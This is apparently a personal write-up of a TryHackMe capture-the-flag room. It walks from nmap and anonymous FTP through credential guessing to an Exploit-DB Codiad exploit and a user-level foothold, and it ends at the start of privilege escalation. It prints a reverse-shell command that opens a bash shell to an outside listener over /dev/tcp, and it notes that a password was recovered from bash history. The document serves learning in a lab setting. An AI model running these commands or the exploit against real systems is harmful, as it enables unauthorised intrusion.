https://tryhackme.com/room/ide

I want to preface this with, I learned a lot from this room. I saw some things in here that I've never seen before. 
I would highly reccomend at least trying to finish this room before reading this writeup.

That being said, lets begin.

As always, I started out with nmap. The command i ran originally was nmap -sC -sV -p- -vv 10.10.37.24 -oA nmap/initial
However that scan was taking a really long time to finish. 
While it was running, I initially saw 3 port pop up
21, 22 and 80. 
Since Im impatient and didnt want to wait for my scan to finish, I started looking at the webpage. 
It was a default apache webpage and gobuster didnt find anything
My nmap scan still wasnt done and I didnt want to wait around doing nothing so I decided to take a look at port 21

â”Œâ”€â”€(rootðŸ’€zero)-[/tryhackme/boxes/ide]
â””â”€# ftp 10.10.151.106 
Connected to 10.10.151.106.
220 (vsFTPd 3.0.3)
Name (10.10.151.106:joker): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

After successfully loging in as anonymous i did some digging around

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 .
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 ...
226 Directory send OK.

I found a cleavarly hidden directory with an annoyingly named file inside. In order to read said file, I had to copy it to my desktop and open it via GUI

Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.

By the time i had found this file and figured out how to read it, my nmap scan had convinently revealed one more port. Port 62337
Since the scan itself hadnt finished running yet, i didnt know for sure what was running on this port,
However, being that port 80 was a dud, i assumed that this was going to another webserver, which would give me my initial foothold.

http://10.10.151.106:62337/ was the magic link. Now i had access to a codiac page
Running gobuster revealed some interesting directories. 
I will admit that i spent way too much time looking throught these directories, because, it was a rabbit hole.
While the directories technically are important, they dont actually matter to us.
So after wasting about 20 minutes looking though them, i remembered the note i found in the FTP server.

"Please use the default password to login"

My first thought was to look up the default codiac credentials, but it turns out there are no default credentials for codiac.
My next thought was to start guessing random default passwords. Assuming the username was john, this is how i got past the login page.
(If manually guessing didnt work i was gonna use Burp to do it for me)

Once i was logged in i started looking around. The website was some sort of project manager, however I didnt see a way to get a shell from there.
So i did what any sensible person would do and i googled the Codiac Version that was running.
I found a nice publicly avalible exploit for this service. 

https://www.exploit-db.com/exploits/49705
using this script, i was able to gain a shell on the target system.

â”€â”€(rootðŸ’€zero)-[/tryhackme/boxes/ide]                                                                                â”‚
â””â”€# python3 49705.py http://10.10.151.106:62337/ john ****** 10.13.27.189 9001 linux                          130 â¨¯ â”‚
[+] Please execute the following command on your vps:                                                                 â”‚
echo 'bash -c "bash -i >/dev/tcp/10.13.27.189/9002 0>&1 2>&1"' | nc -lnvp 9001                                        â”‚
nc -lnvp 9002                                                                                                         â”‚
[+] Please confirm that you have done the two command above [y/n]                                                     â”‚
[Y/n] y                                                                                                               â”‚
[+] Starting...                                                                                                       â”‚
[+] Login Content : {"status":"success","data":{"username":"john"}}                                                   â”‚
[+] Login success!                                                                                                    â”‚
[+] Getting writeable path...                                                                                         â”‚
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}        â”‚
[+] Writeable Path : /var/www/html/codiad_projects                                                                    â”‚
[+] Sending payload...               

â”Œâ”€â”€(rootðŸ’€zero)-[/tryhackme/boxes/ide]                                                                                â”‚
â””â”€# nc -nlvp 9002                                                                                                     â”‚
listening on [any] 9002 ...                                                                                           â”‚
connect to [10.13.27.189] from (UNKNOWN) [10.10.151.106] 50924                                                        â”‚
bash: cannot set terminal process group (916): Inappropriate ioctl for device                                         â”‚
bash: no job control in this shell                                                                                    â”‚
www-data@ide:/var/www/html/codiad/components/filemanager$


It was at this point that i really got stuck.
I spent about 2 hours trying to figure out how to go from www-data to drac (the only other user besides root)
I uploaded linpeas to the machine and ran it several times, however, i couldnt seem to find what I needed in there.
(Im aware that its in there somewhere, but I still have yet to find where. I found what I was looking for with dumb luck).

Since I couldnt find anythign with linpeas, i was genuinly stuck. I had no idea what to do.
So out of desperation i started trying to cat out random files in drac's home directory.
When i was able to read .bash_history i realized just how stupid i was. the .bash_history file contains a base64 encoded password for Drac.

Once I logged in using that password i was able to claim the user flag.
The only thing left to do was root the box.

The first thing i ever do when looking for ways to escelate privileges is sudo -l.
In this case, it provided valuable information
